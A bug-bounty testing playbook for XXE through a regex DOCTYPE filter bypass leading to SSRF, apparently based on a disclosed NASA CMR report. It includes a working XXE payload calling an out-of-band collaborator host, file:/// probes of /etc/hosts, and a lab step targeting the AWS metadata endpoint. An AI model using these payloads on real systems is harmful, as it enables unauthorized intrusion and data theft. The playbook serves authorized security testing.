# Playbook: XXE via Regex DOCTYPE Bypass → SSRF/OOB — 1 case per test

Target: `POST /search/concepts/search` XML (NASA CMR pattern)
Full lesson: `2026/2026-03-17-nasa-cmr-xxe-regex-bypass.md`
Original: https://bugcrowd.com/disclosures/9d2c7b28-7ff7-439c-9149-f74a883815e3/

Rule: 1 test at a time. OOB with collaborator, no prod dump.

## 0. Baseline - XML accepted?
- `POST` with `<aql><q>test</q></aql>` → 200? Save. If not XML, stop.

## 1. Single-line DOCTYPE blocked?
- `<!DOCTYPE foo><a>hi</a>` single line → blocked/stripped? If not blocked, already XXE, go to 3.
- If blocked → filter exists, go to 2 for bypass.

## 2. Multi-line bypass? (ONE newline)
- Same but with newline inside:
```
<!DOCTYPE root [
<!ENTITY x SYSTEM "https://YOUR.oastify.com/ping">
]>
<a>&x;</a>
```
- PASS if: collaborator hit OR different error/time vs Test 1. = regex bypass.
- FAIL: same block → try `\r\n`, comments, case variants, else stop.

## 3. SSRF proof (safe callback, no file)
- Entity to collaborator only, no `file:///`, no metadata. 1 request.
- PASS: HTTP hit from target IP = SSRF. Report here if scope limited.

## 4. Blind oracle? (no exfil)
- `file:///etc/hosts` vs `file:///no_such_xyz` → status/length/time diff? If yes = file enum oracle. Do NOT dump.

## 5. Lab only: OOB exfil + metadata
- External DTD → AWS `169.254.169.254`, ECS, kernel. Only on own lab / with explicit permission.

## Notes template
```
Target: POST ... Content-Type=xml?
0 xml 200? y/n
1 single DOCTYPE blocked? y/n
2 multi bypass + collab hit? y/n
3 SSRF IP=
4 file oracle diff? y/n
```
